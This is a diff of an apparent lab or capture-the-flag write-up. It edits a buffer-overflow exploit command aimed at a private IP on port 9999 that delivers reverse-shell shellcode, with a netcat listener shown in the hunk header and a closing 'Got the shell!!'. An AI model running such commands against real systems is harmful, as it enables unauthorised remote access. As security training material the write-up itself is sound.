@@ -117,7 +117,7 @@ sudo rlwrap -a nc -lvnp 443
 
 Exploit:
 ```
-./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=1200 --buffhead='' --offset=524 --hexcontent=l311712f3 --after=shellcode --nopsa=10 --shellcode=reverse2
+./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=1200 --buffhead='' --offset=524 --hexcontent=l311712f3 --after=shellcode --nopsa=10 --shellcode=reverse
 ```
 
 Got the shell!!
